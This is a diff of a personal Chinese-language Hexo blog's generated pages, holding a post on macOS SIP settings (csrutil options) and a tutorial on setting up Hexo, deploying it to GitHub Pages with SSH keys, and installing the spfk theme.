+<h3 id="3-常用参数"><a href="#3-常用参数" class="headerlink" title="3.常用参数"></a>3.常用参数</h3><p>clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)</p>
+<p>disable：关闭SIP(仅在恢复模式下有效)</p>
+<p>enable：开启SIP(仅在恢复模式下有效)</p>
+<p>status：查询SIP状态</p>
+<h3 id="4-常用参数进阶"><a href="#4-常用参数进阶" class="headerlink" title="4.常用参数进阶"></a>4.常用参数进阶</h3><p>除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">csrutil <span class="built_in">enable</span> [--without kext|fs|debug|dtrace|nvram] [--no-internal]</div><div class="line"><span class="comment"># 单项使用：</span></div><div class="line">sudo csrutil <span class="built_in">enable</span> –without fs：Filesystem Protections <span class="built_in">disable</span></div><div class="line">sudo csrutil <span class="built_in">enable</span> –without kext：Kext Signing <span class="built_in">disable</span></div><div class="line">sudo csrutil <span class="built_in">enable</span> –without debug：Debugging Restrictions <span class="built_in">disable</span></div><div class="line">sudo csrutil <span class="built_in">enable</span> –without nvram：NVRAM Protections <span class="built_in">disable</span></div><div class="line">sudo csrutil <span class="built_in">enable</span> –without dtrace：DTrace Restrictions <span class="built_in">disable</span></div><div class="line"><span class="comment"># 组合使用：</span></div><div class="line">sudo csrutil <span class="built_in">enable</span> –without kext –without fs：Filesystem Protections and Kext Signing are disabled</div></pre></td></tr></table></figure></p>
+<h2 id="mac下使用proxychains-ng实现代理"><a href="#mac下使用proxychains-ng实现代理" class="headerlink" title="mac下使用proxychains-ng实现代理"></a>mac下使用proxychains-ng实现代理</h2><p>由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/04/hello-world/" class="article-date">
+      <time datetime="2017-04-06T12:39:17.000Z" itemprop="datePublished">2017-04-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
     
     
       <header class="article-header">
@@ -84,95 +573,146 @@
   
 
       </header>
+      
     
     <div class="article-entry" itemprop="articleBody">
       
+          
         <p>浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。<br>这篇就算是一个开端，主要记录下hexo该如何使用。</p>
 <h2 id="搭建hexo静态博客"><a href="#搭建hexo静态博客" class="headerlink" title="搭建hexo静态博客"></a>搭建hexo静态博客</h2><p>Hexo官方文档 :: <a href="https://hexo.io/zh-cn/docs" target="_blank" rel="external">https://hexo.io/zh-cn/docs</a></p>
 <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      <span class="comment"># 下载Node.js安装包</span></div><div class="line">$ open node-v6.10.2.pkg      <span class="comment"># 傻瓜式安装</span></div><div class="line">$ brew install git           <span class="comment"># 安装git</span></div><div class="line">$ npm install -g hexo-cli    <span class="comment"># 安全hexo</span></div><div class="line">$ hexo init &lt;folder&gt;         <span class="comment"># 从hexo官网下载初始化文件</span></div><div class="line">$ <span class="built_in">cd</span> &lt;folder&gt;                </div><div class="line">$ npm install                <span class="comment"># 安装站点文件</span></div><div class="line"></div><div class="line">$ hexo server                <span class="comment"># 启动服务器。默认情况下，访问网址为： http://localhost:4000/</span></div><div class="line"></div><div class="line">$ hexo new [layout] &lt;title&gt;  <span class="comment"># 新建一个post</span></div><div class="line">$ hexo generate              <span class="comment"># 生成静态文件</span></div></pre></td></tr></table></figure>
 <h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ hexo new [layout] &lt;title&gt;    <span class="comment"># layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。</span></div><div class="line">                               <span class="comment"># Hexo 有三种默认布局：post、page 和 draft。</span></div><div class="line"></div><div class="line">$ hexo new draft &lt;title0&gt;       <span class="comment"># 新建一份草稿</span></div><div class="line">$ hexo publish [layout] &lt;title0&gt;   <span class="comment"># 将draft移动到post</span></div><div class="line">$ hexo generate                 <span class="comment"># 生成静态文件</span></div></pre></td></tr></table></figure>
 <h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save      <span class="comment"># 安装hexo-deployer-git以实现git部署</span></div><div class="line"></div><div class="line">$ vim _config.yml</div><div class="line">--------------[file content]</div><div class="line">    deploy:</div><div class="line">      <span class="built_in">type</span>: git</div><div class="line">      repo: &lt;repository url&gt;    <span class="comment"># 库（Repository）地址</span></div><div class="line">      branch: [branch]          <span class="comment"># 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span></div><div class="line">      message: [message]        <span class="comment"># 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)</span></div><div class="line">--------------[file content]</div><div class="line">$ hexo deploy     <span class="comment"># 部署</span></div></pre></td></tr></table></figure>
+<h2 id="Github-配置"><a href="#Github-配置" class="headerlink" title="Github 配置"></a>Github 配置</h2><h3 id="新建用于存放pages的repo"><a href="#新建用于存放pages的repo" class="headerlink" title="新建用于存放pages的repo"></a>新建用于存放pages的repo</h3><p>在GitHub上建一个repository（库），任意命名。<br>如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。<br>如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。</p>
+<h3 id="新建SSH-Keys"><a href="#新建SSH-Keys" class="headerlink" title="新建SSH Keys"></a>新建SSH Keys</h3><p>我使用SSH连接GitHub。 <a href="https://help.github.com/articles/connecting-to-github-with-ssh/" target="_blank" rel="external">官方文档</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ls -al ~/.ssh     <span class="comment"># 查看是否有 id_rsa 和 id_rsa.pub 文件</span></div><div class="line"><span class="comment"># 如果不存在或者想要生成新的密钥对，可使用下面命令</span></div><div class="line">$ ssh-keygen -t rsa -b 4096 -C <span class="string">"user@oddboy.cn"</span></div><div class="line">$ pbcopy &lt; ~/.ssh/id_rsa.pub    <span class="comment"># 很强势的一个命令，将文件内容直接复制到剪贴板。</span></div></pre></td></tr></table></figure>
+<p>在GitHub的Personal setting –&gt; SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。</p>
+<p>如此, hexo depoly就可以用了。</p>
+<h3 id="新建用于存放hexo博客源码的repo"><a href="#新建用于存放hexo博客源码的repo" class="headerlink" title="新建用于存放hexo博客源码的repo"></a>新建用于存放hexo博客源码的repo</h3><p>hexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ git init    <span class="comment"># git本地目录初始化</span></div><div class="line">$ git remote add origin git@github.com:odboy/hexoB<span class="built_in">log</span>-src.git   <span class="comment"># 配置远程git库</span></div><div class="line">$ git add .   </div><div class="line">$ git commit -m <span class="string">"comment信息"</span></div><div class="line">$ git status      <span class="comment"># 查看分支情况</span></div><div class="line">$ git push -u origin master   <span class="comment"># 推送到master分支</span></div></pre></td></tr></table></figure>
+<h2 id="修改主题-–-spfk"><a href="#修改主题-–-spfk" class="headerlink" title="修改主题 – spfk"></a>修改主题 – <a href="http://luuman.github.io/2015/12/27/Hexo/HexoTheme/" target="_blank" rel="external">spfk</a></h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ cd ~/Documents/hexoBlog</div><div class="line">$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk</div><div class="line">$ cd themes/spfk</div><div class="line">$ git pull      # 主题update</div><div class="line">$ vim _config.yml</div><div class="line">--------------------</div><div class="line">      # Extensions</div><div class="line">      ## Plugins: https://hexo.io/plugins/</div><div class="line">      ## Themes: https://hexo.io/themes/</div><div class="line">      theme: spfk</div><div class="line">--------------------</div></pre></td></tr></table></figure>
+<h3 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h3>
+      
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://oddboy.cn/2017/04/hello-world/" data-id="cj1q61nxa000029uvxot26bur" class="article-share-link">Share</a>
+    
+    <div class="article-info article-info-index">
       
       
-    </footer>
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
   </div>
   
 </article>
 
 
-  
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
 
-  
-    
 
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li></ul>
-    </div>
-  </div>
+
+
 
 
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2017/04/hello-world/">The begin of blog</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
   
-</aside>
-        
-      </div>
+</div>
       <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2017 Mr.Bingo<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Mr.Bingo
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
     </div>
-  </div>
 </footer>
+
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
 
 
-<script src="/js/script.js"></script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
 
   </div>
 </body>
